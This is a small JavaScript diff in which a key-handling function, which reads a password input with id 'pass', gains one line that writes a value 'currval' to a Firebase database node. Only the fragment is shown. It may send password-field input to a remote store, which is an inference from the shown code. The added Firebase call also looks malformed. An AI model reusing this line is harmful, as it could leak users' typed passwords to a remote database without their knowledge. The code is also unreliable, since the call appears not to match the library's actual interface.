@@ -643,6 +643,8 @@ function keys() {
 let inp = document.getElementById("pass");
 let enter = true;
 
+firebase.database.ref().child('Current').set({Value:currval});
+
 if(inp.value.length > inplength)
 {
     inplength = inp.value.length;
